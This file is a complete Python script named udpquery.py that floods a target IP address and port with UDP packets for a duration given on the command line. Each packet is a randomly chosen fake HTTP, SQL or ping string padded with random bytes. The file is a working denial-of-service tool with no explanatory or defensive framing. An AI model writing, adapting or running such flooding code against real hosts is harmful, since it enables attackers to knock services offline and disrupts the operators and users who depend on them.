# udpquery.py
import socket
import random
import sys
import time

def udpquery_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    queries = [
        b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla\r\n\r\n",
        b"POST /api/data HTTP/1.1\r\nContent-Type: application/json\r\n\r\n",
        b"SELECT * FROM users WHERE id=",
        b"CONNECT server.example.com:443 HTTP/1.1\r\n\r\n",
        b"OPTIONS * HTTP/1.1\r\nHost: target.com\r\n\r\n",
        b"QUERY SELECT * FROM database WHERE 1=1",
        b"PING server.example.com\r\n",
        b"TIME " + str(time.time()).encode() + b"\r\n"
    ]
    
    timeout = time.time() + duration
    while time.time() < timeout:
        query = random.choice(queries)
        random_bytes = random._urandom(random.randint(50, 500))
        data = query + random_bytes
        sock.sendto(data, (target_ip, target_port))
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    udpquery_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
